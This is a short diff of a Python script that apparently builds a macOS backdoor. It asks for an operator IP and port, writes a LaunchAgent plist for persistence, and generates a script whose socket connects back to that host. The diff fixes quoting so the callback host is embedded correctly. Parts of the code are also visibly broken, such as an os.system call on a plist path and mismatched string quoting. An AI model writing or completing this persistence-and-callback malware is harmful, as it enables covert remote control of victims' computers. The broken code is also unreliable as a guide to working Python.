@@ -1,5 +1,6 @@
 import os
-"ip" = input("Enter IP: ")
+ip = input("Enter IP: ")
+a = '"'
 port = int(input("Enter port: "))
 NAME = input("Enter name of script: ")
 other_python_script = f"""
@@ -28,7 +29,7 @@ daemon = ("<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.appl
 with open("com.example.exampld.plist", "w") as python_script_file:
     python_script_file.write(l)
 os.system("Library/LaunchAgents/com.example.exampld.plist")
-SERVER_HOST = {ip}
+SERVER_HOST = {a+ip+a}
 SERVER_PORT = {port}
 BUFFER_SIZE = 1024")
 # create the socket object
